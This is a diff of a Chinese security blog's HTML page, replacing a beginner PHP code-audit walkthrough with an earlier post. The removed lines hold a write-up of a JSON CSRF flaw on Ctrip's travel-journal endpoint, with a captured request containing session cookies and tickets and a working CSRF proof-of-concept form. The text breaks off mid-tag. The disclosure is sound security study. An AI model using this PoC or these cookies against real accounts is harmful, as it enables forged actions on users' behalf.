@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="漏洞挖掘,Json Csrf," />
+  <meta name="keywords" content="PHP," />
 
 
 
@@ -88,31 +88,43 @@
 
 
 
-<meta name="description" content="内部文章，禁止转载">
-<meta name="keywords" content="漏洞挖掘,Json Csrf">
+<meta name="description" content="介绍这是一个GITHUB上找到的一个使用原生PHP代码写的一个博客，地址是:https://github.com/qinshuang1998/Tiger-Blog，但是这里有很多功能没有实现（这个作者是不是比我还懒，，，哈哈哈），然后我分析的话只是想让大家明白一下这些功能是如何实现的，还有如果有漏洞的话我也会写出来（因为我是边读边写，然后自己分析一下，但是因为我水平也不是很厉害，所以有很多漏洞也没">
+<meta name="keywords" content="PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="携程某处存在Json格式的Csrf漏洞发游记">
-<meta property="og:url" content="127.0.0.1/2018/06/21/携程某处存在Csrf漏洞发游记/index.html">
+<meta property="og:title" content="分析原生PHP博客-第二篇">
+<meta property="og:url" content="127.0.0.1/2018/07/10/分析原生PHP博客-第二篇/index.html">
 <meta property="og:site_name" content="Cai_Team">
-<meta property="og:description" content="内部文章，禁止转载">
+<meta property="og:description" content="介绍这是一个GITHUB上找到的一个使用原生PHP代码写的一个博客，地址是:https://github.com/qinshuang1998/Tiger-Blog，但是这里有很多功能没有实现（这个作者是不是比我还懒，，，哈哈哈），然后我分析的话只是想让大家明白一下这些功能是如何实现的，还有如果有漏洞的话我也会写出来（因为我是边读边写，然后自己分析一下，但是因为我水平也不是很厉害，所以有很多漏洞也没">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/p6gljipfdvxyi9nqklpfywuf/image_1cggtjqgn2r21dlc128812gu1u849.png">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/j11j045f8xz72nmpw04kvvrd/image_1cggtlmfhq3l50r8in147aifum.png">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/7md936r409zlyh8ss369f99o/image_1cggtnrtg4h315d2174oi771rm413.png">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/otd02a8z2x31i1j2udrolgco/image_1cggtquogas41v4c7keeju1p7p1g.png">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/bg5tze0r4ilxfnyk4hx2zqs1/image_1cggulta21htoq8d1q47dqm12nc1t.png">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/hzrjgza3ogjghpkbdxwlxp4a/image_1cggv215618qv1c332bsaufrse2a.png">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/jec1gasck1j6t5ns9dyyve3e/image_1cggvbjp914dp14bt1mec1j0r15vi2n.png">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/a3m0bhbmy7ximhww0y1rkas3/image_1cggvcoam1i5h3q4njf1sf41a3034.png">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/ykureziocu1mytqfp1b16wm9/image_1cggve0kq18quhsf1j4al8hfi4h.png">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/57mwvrqtms0a7zrmawc0dflg/image_1cggvl77q79isqk1l4di5ts0u4u.png">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/knjs1crgvnkuduke1akrzii8/image_1cgh0lpg61nhdgll1aqj1a3h1f0t78.png">
-<meta property="og:image" content="http://static.zybuluo.com/1kbfree/1nil8f18impk1tdhrbjynau8/image_1cgh0mh7sh7ujg710vt1uhc1sd47l.png">
-<meta property="og:updated_time" content="2018-06-21T16:29:25.077Z">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/y253t8g6t8ct44fjd2q1i1hp/image_1chv32k2d1s6c1dp44h57298is9.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/5h92eelh5zlrpn3vfrakjo5c/image_1chv3750l31210tlns91rc7mlom.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/y2bzhzgo1rk1crxwyot68h9s/image_1chv37qd4bluakblkmh17k8213.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/0vzpjjzrcc43mj67svdwsnzl/image_1chv3h8iu1alr1u7b1b3015dq19u61g.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/fzjzo21zxp86npuirk9cl3pk/php.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/9vbxv83wly06fgrb5c3o01bj/image_1chv3taag1o2119grhdq1vsuos0l.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/j2ua1x2o2k0y2x6nktgi7z1s/image_1chv421os1d9e1eaequa1fu61rp83f.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/jjv1b3ykbxdacsy78apoiaz1/image_1chv4b03q5ps106732kps68no4s.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/tlgsb75z0prxkkyspwclzfml/image_1chv4djq76svshi2s31otkm7g59.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/brc7ftnqs452j4xf08r6uj8j/php.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/5l8j1c0xqox3ml672s9vuypa/image_1chv4qovjliodscff9nr61smr82.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/5pqcsn5zw54secwj3s3ucf92/image_1chv5gf6v1fst1gv71kj61i161p538v.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/ooxrb0fsh5ipc0zij5iwcbp6/image_1chv5i6ucjs1vni1vonsji1pcn9c.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/sk4m0o2rczor7msf5pdt26yv/image_1chv5innl6vj1lo54241k2v1jdo9p.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/xhumgcamh5j9uge6bj2ur0e4/php.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/aif4kvy0lrvr90bdcv39pbpo/image_1chv5pvt5r761cm817v410slt023l.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/76ue5oiav00tak7dvn1e077g/image_1chv5r0er6g8qe01tt81fdkhf842.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/twgquzlmt9muvuo9lak67i8p/image_1chv5rc1g1a5t15ef9qu1hsqcbe4f.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/u0ds3ms0ocjbpibqcvyk2oi9/image_1chv6gl8n15dpns31br5p11ttf5c.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/hb07nekxlo0afqp3jvfma62m/image_1chv6jdc0lak1c5h1bvl1if21es37p.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/2stc0xet22rj0o3ziicshqm1/image_1ci0vr2aq1udv1t4pun115fp1a6bp.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/mr0s9mk7c9vjn1oi37zc3xep/image_1ci100s7mi9g14vbasa16ft1aot26.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/y77pa1n0wrgpus8ufy3ma3cf/image_1ci105k2r71l1k2d1na5sb11g7s2j.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/xm9ymwrgn5obbsfwyb7dsyl4/image_1ci10doif73q1vun1l5fq9a9i70.png">
+<meta property="og:updated_time" content="2018-07-10T02:39:41.196Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="携程某处存在Json格式的Csrf漏洞发游记">
-<meta name="twitter:description" content="内部文章，禁止转载">
-<meta name="twitter:image" content="http://static.zybuluo.com/1kbfree/p6gljipfdvxyi9nqklpfywuf/image_1cggtjqgn2r21dlc128812gu1u849.png">
+<meta name="twitter:title" content="分析原生PHP博客-第二篇">
+<meta name="twitter:description" content="介绍这是一个GITHUB上找到的一个使用原生PHP代码写的一个博客，地址是:https://github.com/qinshuang1998/Tiger-Blog，但是这里有很多功能没有实现（这个作者是不是比我还懒，，，哈哈哈），然后我分析的话只是想让大家明白一下这些功能是如何实现的，还有如果有漏洞的话我也会写出来（因为我是边读边写，然后自己分析一下，但是因为我水平也不是很厉害，所以有很多漏洞也没">
+<meta name="twitter:image" content="http://static.zybuluo.com/1kbfree/y253t8g6t8ct44fjd2q1i1hp/image_1chv32k2d1s6c1dp44h57298is9.png">
 
 
 
@@ -142,7 +154,7 @@
 
 
 
-  <link rel="canonical" href="127.0.0.1/2018/06/21/携程某处存在Csrf漏洞发游记/"/>
+  <link rel="canonical" href="127.0.0.1/2018/07/10/分析原生PHP博客-第二篇/"/>
 
 
 
@@ -150,8 +162,8 @@
 
 <script>
     (function () {
-        if ('iamfree_refuel_self') {
-            if (prompt('请输入文章密码') !== 'iamfree_refuel_self') {
+        if ('') {
+            if (prompt('请输入文章密码') !== '') {
                 alert('大哥你好，这是内部文章或未写全文章( 我要脸 )，如果没有密码请不要访问，感谢~');
                 if (history.length === 1) {
                     location.replace("https://flagiamfree.github.io/"); //首页
@@ -172,7 +184,7 @@
   daovoice('update');
   </script>
 
-  <title>携程某处存在Json格式的Csrf漏洞发游记 | Cai_Team</title>
+  <title>分析原生PHP博客-第二篇 | Cai_Team</title>
   
 
 
@@ -344,7 +356,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="127.0.0.1/2018/06/21/携程某处存在Csrf漏洞发游记/">
+    <link itemprop="mainEntityOfPage" href="127.0.0.1/2018/07/10/分析原生PHP博客-第二篇/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -361,7 +373,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">携程某处存在Json格式的Csrf漏洞发游记</h1>
+          <h1 class="post-title" itemprop="name headline">分析原生PHP博客-第二篇</h1>
         
 
         <div class="post-meta">
@@ -373,8 +385,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-21T19:13:28+08:00">
-                2018-06-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-10T10:38:03+08:00">
+                2018-07-10
               </time>
             
 
@@ -396,30 +408,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web攻防/" itemprop="url" rel="index">
-                    <span itemprop="name">Web攻防</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web攻防/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web攻防/渗透测试/作者：Iamfree/" itemprop="url" rel="index">
-                    <span itemprop="name">作者：Iamfree</span>
+                  <a href="/categories/编程/" itemprop="url" rel="index">
+                    <span itemprop="name">编程</span>
                   </a>
                 </span>
 
@@ -436,8 +426,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/06/21/携程某处存在Csrf漏洞发游记/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/06/21/携程某处存在Csrf漏洞发游记/" itemprop="commentCount"></span>
+                <a href="/2018/07/10/分析原生PHP博客-第二篇/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/07/10/分析原生PHP博客-第二篇/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -464,7 +454,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  956
+                  1,076
                 </span>
               
 
@@ -489,41 +479,66 @@
       
 
       
-        <blockquote class="blockquote-center"><p>内部文章，禁止转载</p>
-</blockquote>
+        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>这是一个<code>GITHUB</code>上找到的一个使用原生<code>PHP</code>代码写的一个博客，地址是:<code>https://github.com/qinshuang1998/Tiger-Blog</code>，但是这里有很多功能没有实现（这个作者是不是比我还懒，，，哈哈哈），然后我分析的话只是想让大家明白一下这些功能是如何实现的，还有如果有漏洞的话我也会写出来（因为我是边读边写，然后自己分析一下，但是因为我水平也不是很厉害，所以有很多漏洞也没看出来还请大佬们多多指教），对我们的代码审计有很大的帮助，不多说啦，</p>
 <a id="more"></a>
+<h3 id="源代码讲解"><a href="#源代码讲解" class="headerlink" title="源代码讲解"></a>源代码讲解</h3><h4 id="First、"><a href="#First、" class="headerlink" title="First、"></a>First、</h4><p>这里说明一下，我分析的时候，只会写注释，或者截屏然后在旁边标注一下，因为我觉得这样会比较高效一点，所以你们可以下载这个源代码，然后按照我分析的然后再自己看一下，大概也就能明白功能实现原理了，祝你学习愉快。</p>
+<h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><p>这个是首页文件( 废话，我也知道 )~</p>
+<p><img src="http://static.zybuluo.com/1kbfree/y253t8g6t8ct44fjd2q1i1hp/image_1chv32k2d1s6c1dp44h57298is9.png" alt="image_1chv32k2d1s6c1dp44h57298is9.png-125.8kB"></p>
+<h5 id="首先看第三行和第四行："><a href="#首先看第三行和第四行：" class="headerlink" title="首先看第三行和第四行："></a>首先看第三行和第四行：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>(<span class="string">'./inc/conn.php'</span>); <span class="comment">// 连接数据库</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./inc/func.php'</span>); <span class="comment">// 引入函数文件(一般都是封装了常用的函数,方便调用)</span></span><br></pre></td></tr></table></figure>
+<p>这个不必多说。</p>
+<h5 id="接着到了第七行："><a href="#接着到了第七行：" class="headerlink" title="接着到了第七行："></a>接着到了第七行：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = $_SERVER[<span class="string">'REQUEST_URI'</span>]; <span class="comment">//这个功能我也不知道是干嘛的，我们来输出一下。</span></span><br><span class="line">var_dump( $url );<span class="keyword">die</span>; <span class="comment">//输出一下$url,并且不然他执行下面的代码</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://static.zybuluo.com/1kbfree/5h92eelh5zlrpn3vfrakjo5c/image_1chv3750l31210tlns91rc7mlom.png" alt="image_1chv3750l31210tlns91rc7mlom.png-54.1kB"><br><img src="http://static.zybuluo.com/1kbfree/y2bzhzgo1rk1crxwyot68h9s/image_1chv37qd4bluakblkmh17k8213.png" alt="image_1chv37qd4bluakblkmh17k8213.png-57.7kB"></p>
+<p>这个是用于输出除了域名外的路径。</p>
+<h5 id="第8行："><a href="#第8行：" class="headerlink" title="第8行："></a>第8行：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = parse_url($url); <span class="comment">// parse_url将路径放在了数组的path，将?后面的参数放在了数组的query</span></span><br><span class="line">var_dump( $url );<span class="keyword">die</span>; <span class="comment">// 如果上面字体描述的不懂我们再来打印一下。</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://static.zybuluo.com/1kbfree/0vzpjjzrcc43mj67svdwsnzl/image_1chv3h8iu1alr1u7b1b3015dq19u61g.png" alt="image_1chv3h8iu1alr1u7b1b3015dq19u61g.png-29.6kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/fzjzo21zxp86npuirk9cl3pk/php.png" alt="php.png-146.3kB"></p>
+<h5 id="打印-num："><a href="#打印-num：" class="headerlink" title="打印$num："></a>打印$num：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump( $num );<span class="keyword">die</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="http://static.zybuluo.com/1kbfree/9vbxv83wly06fgrb5c3o01bj/image_1chv3taag1o2119grhdq1vsuos0l.png" alt="image_1chv3taag1o2119grhdq1vsuos0l.png-25.3kB"></p>
+<p><em>这里为什么是5呢？我也好奇，然后我来到数据库看了一下。</em></p>
+<p><img src="http://static.zybuluo.com/1kbfree/j2ua1x2o2k0y2x6nktgi7z1s/image_1chv421os1d9e1eaequa1fu61rp83f.png" alt="image_1chv421os1d9e1eaequa1fu61rp83f.png-85kB"></p>
+<p><em>这个5就是<code>article</code>表的数量</em></p>
+<h5 id="16-23行"><a href="#16-23行" class="headerlink" title="16-23行"></a>16-23行</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">'page'</span>])&#123;</span><br><span class="line">    <span class="comment">// 把个个参数都打印一下。</span></span><br><span class="line">    $pageval=$_GET[<span class="string">'page'</span>];</span><br><span class="line">    <span class="keyword">echo</span>( <span class="string">'$pageval -&gt; '</span>.$pageval .<span class="string">"&lt;br /&gt;"</span>);</span><br><span class="line">    $page=($pageval<span class="number">-1</span>)*$pagesize;</span><br><span class="line">    <span class="keyword">echo</span>( <span class="string">'$page -&gt; '</span>.$page .<span class="string">"&lt;br /&gt;"</span>);</span><br><span class="line">    $page.=<span class="string">','</span>;</span><br><span class="line">    <span class="keyword">echo</span>( <span class="string">'$page -&gt; '</span>.$page .<span class="string">"&lt;br /&gt;"</span>);<span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="http://static.zybuluo.com/1kbfree/jjv1b3ykbxdacsy78apoiaz1/image_1chv4b03q5ps106732kps68no4s.png" alt="image_1chv4b03q5ps106732kps68no4s.png-49.1kB"></p>
+<p><em>看不明白看下去先</em></p>
+<p><img src="http://static.zybuluo.com/1kbfree/tlgsb75z0prxkkyspwclzfml/image_1chv4djq76svshi2s31otkm7g59.png" alt="image_1chv4djq76svshi2s31otkm7g59.png-134.4kB"></p>
+<p><em>然后下面的就基本上是简单的<code>SQL</code>语句了，不讲解了，开始另一个文件</em></p>
+<h4 id="admin功能"><a href="#admin功能" class="headerlink" title="admin功能"></a>admin功能</h4><p>先讲解后台功能的实现。</p>
+<h5 id="登陆功能"><a href="#登陆功能" class="headerlink" title="登陆功能"></a>登陆功能</h5><p><img src="http://static.zybuluo.com/1kbfree/brc7ftnqs452j4xf08r6uj8j/php.png" alt="php.png-86.7kB"></p>
 <blockquote>
-<p>URL -&gt; <a href="http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals" target="_blank" rel="noopener">http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals</a></p>
+<p>在<code>xxx/admin/login.php</code></p>
 </blockquote>
-<h4 id="1-打开URL后，页面如图"><a href="#1-打开URL后，页面如图" class="headerlink" title="1. 打开URL后，页面如图"></a>1. 打开URL后，页面如图</h4><p><img src="http://static.zybuluo.com/1kbfree/p6gljipfdvxyi9nqklpfywuf/image_1cggtjqgn2r21dlc128812gu1u849.png" alt="image_1cggtjqgn2r21dlc128812gu1u849.png-358.9kB"></p>
-<h4 id="2-点击上图的写游记"><a href="#2-点击上图的写游记" class="headerlink" title="2. 点击上图的写游记"></a>2. 点击上图的写游记</h4><p><img src="http://static.zybuluo.com/1kbfree/j11j045f8xz72nmpw04kvvrd/image_1cggtlmfhq3l50r8in147aifum.png" alt="image_1cggtlmfhq3l50r8in147aifum.png-146.8kB"><br><em>点击后会进入另一个页面，如下图</em></p>
-<h4 id="3-点击发布"><a href="#3-点击发布" class="headerlink" title="3. 点击发布"></a>3. 点击发布</h4><p><img src="http://static.zybuluo.com/1kbfree/7md936r409zlyh8ss369f99o/image_1cggtnrtg4h315d2174oi771rm413.png" alt="image_1cggtnrtg4h315d2174oi771rm413.png-80.9kB"><br><em>又又又还有一个页面</em></p>
-<h4 id="4-选好后点击提交并且抓包"><a href="#4-选好后点击提交并且抓包" class="headerlink" title="4. 选好后点击提交并且抓包"></a>4. 选好后点击提交并且抓包</h4><p><img src="http://static.zybuluo.com/1kbfree/otd02a8z2x31i1j2udrolgco/image_1cggtquogas41v4c7keeju1p7p1g.png" alt="image_1cggtquogas41v4c7keeju1p7p1g.png-99.4kB"></p>
-<p>抓取的数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /TravelSite/Member/SaveNewTravel HTTP/1.1</span><br><span class="line">Host: you.ctrip.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://you.ctrip.com/TravelSite/Member/EditNewTravel?travelId=3689394</span><br><span class="line">Content-Length: 519</span><br><span class="line">Cookie: _bfa=1.1529559162771.3aowri.1.1529564159709.1529575803710.3.105; adscityen=Meizhou; _RF1=120.239.228.99; _RSG=T6KJObxFMeEUqcn7NtwLW8; _RDG=2885568a6cac882bb818690bc2de21a339; _RGUID=ea163fb9-584d-419d-8815-eb75c7c66d1e; _jzqco=%7C%7C%7C%7C1529559191059%7C1.113394883.1529559190871.1529565815866.1529576375632.1529565815866.1529576375632.undefined.0.0.20.20; __zpspc=9.3.1529576375.1529576375.1%234%7C%7C%7C%7C%7C%23; MKT_Pagesource=PC; _bfi=p1%3D290606%26p2%3D290606%26v1%3D105%26v2%3D104; login_uid=92A18FCF669DF32698BF54DD2CE7E1D1; login_type=0; UUID=1508E76B015E4E609698BCA0B9CA2320; IsPersonalizedLogin=F; appFloatCnt=1; manualclose=1; ASP.NET_SessionSvc=MTAuOC4xODkuNjB8OTA5MHxqaW5xaWFvfGRlZmF1bHR8MTUyNjUzNzExNDI2Mw; bdshare_firstime=1529559824392; _abtest_userid=a62eb7c0-4054-48fa-8421-eaae213957d6; cticket=1C81168DBA3550FFB18DE9387721086AA1AB2E3206164EF5DE4BF207D9F2AE8E; ticket_ctrip=bJ9RlCHVwlu1ZjyusRi+ypZ7X2r4+yojO82DkiXyGYeP0Mg96gJEQ+LWMo18plOrPdkAeXYih6tqb1Y94QwsvBuemHYmTAK0dmQ8i4jhcqKYiDhbXtS6b1594tYlhp4+VrZJoGlAq59Sa38eZFCT3+EpL6sqTuRUM54pmZHcxmxbT82oGUQF+6luF9/OQHCxD8ehHHp4AyfgBbwPE8WZTr6KEJYMAnGc5VDEoyGx91d2l+3B3eOk3Y2gGeR7BJbvn2PtKP3/2CZEUX0mKtoYQ5utvxMGO5R+fKJN1MMgSTw=; AHeadUserInfo=VipGrade=0&amp;UserName=&amp;NoReadMessageCount=0; DUID=u=08F36DBB6DC5886589DDBB5100AD9461&amp;v=0; IsNonUser=F; ASP.NET_SessionId=tcktpejhlxfokmlnf1q1zn3j; _bfs=1.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;Content&quot;:&quot;&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;&quot;,&quot;Title&quot;:&quot;11111&quot;,&quot;UploadPicContent&quot;:&quot;&quot;,&quot;CoverImageId&quot;:0,&quot;TravelId&quot;:&quot;3689394&quot;,&quot;CoverLocationY&quot;:0,&quot;ClassifiedInfo&quot;:&#123;&quot;DistrictList&quot;:[&#123;&quot;DistrictId&quot;:&quot;110000&quot;,&quot;DistrictName&quot;:&quot;ä¸­å½ï¼äºæ´²&quot;,&quot;IsSelected&quot;:true&#125;,&#123;&quot;DistrictId&quot;:&quot;1&quot;,&quot;DistrictName&quot;:&quot;åäº¬ï¼ä¸­å½&quot;,&quot;IsSelected&quot;:true&#125;],&quot;TagList&quot;:[],&quot;TravelId&quot;:&quot;3689394&quot;,&quot;ClassifiedType&quot;:6,&quot;TravelDays&quot;:1111111111111,&quot;DepartureDate&quot;:&quot;2018-06-13&quot;,&quot;Consume&quot;:111,&quot;CompanionType&quot;:1&#125;,&quot;PublishStatus&quot;:1&#125;</span><br></pre></td></tr></table></figure></p>
-<p><em>可以看到这里是由 <code>Json</code> 传递的，并且没有 <code>Token</code> 之类的验证，那么就可能会存在 <code>Csrf</code></em> </p>
-<h4 id="5-我们将其构造成-Csrf-Poc"><a href="#5-我们将其构造成-Csrf-Poc" class="headerlink" title="5. 我们将其构造成 Csrf Poc"></a>5. 我们将其构造成 <code>Csrf Poc</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://you.ctrip.com/TravelSite/Member/SaveNewTravel"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"Content":"&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;","Title":"11111","UploadPicContent":"","CoverImageId":0,"TravelId":"3689394","CoverLocationY":0,"ClassifiedInfo":&#123;"DistrictList":[&#123;"DistrictId":"110000","DistrictName":"涓浗锛屼簹娲�","IsSelected":true&#125;,&#123;"DistrictId":"1","DistrictName":"鍖椾含锛屼腑鍥�","IsSelected":true&#125;],"TagList":[],"TravelId":"3689394","ClassifiedType":6,"TravelDays":1111111111111,"DepartureDate":"2018-06-13","Consume":111,"CompanionType":1&#125;,"PublishStatus":1'</span> <span class="attr">value</span>=<span class="string">'"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h5 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h5><p>很多人会问<code>Csrf Poc</code>数据包中的如下代码是干嘛的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;PublishStatus&quot;:1&apos; value=&apos;&quot;&#125;&apos;</span><br></pre></td></tr></table></figure></p>
-<p>那么下面我就来解答一下~</p>
-<h6 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h6><p>我们打开这个构造好的<code>Csrf Poc</code>，并且抓包。</p>
-<p><img src="http://static.zybuluo.com/1kbfree/bg5tze0r4ilxfnyk4hx2zqs1/image_1cggulta21htoq8d1q47dqm12nc1t.png" alt="image_1cggulta21htoq8d1q47dqm12nc1t.png-161.4kB"></p>
-<p>可以看到，这里会多出一个<code>=</code>号，这是为什么呢？我就不拐弯抹角了，看如下案例。</p>
-<h6 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h6><p>创建一个<code>1.html</code>文件，代码如下:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>iamfree<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://www.baidu.com"</span> <span 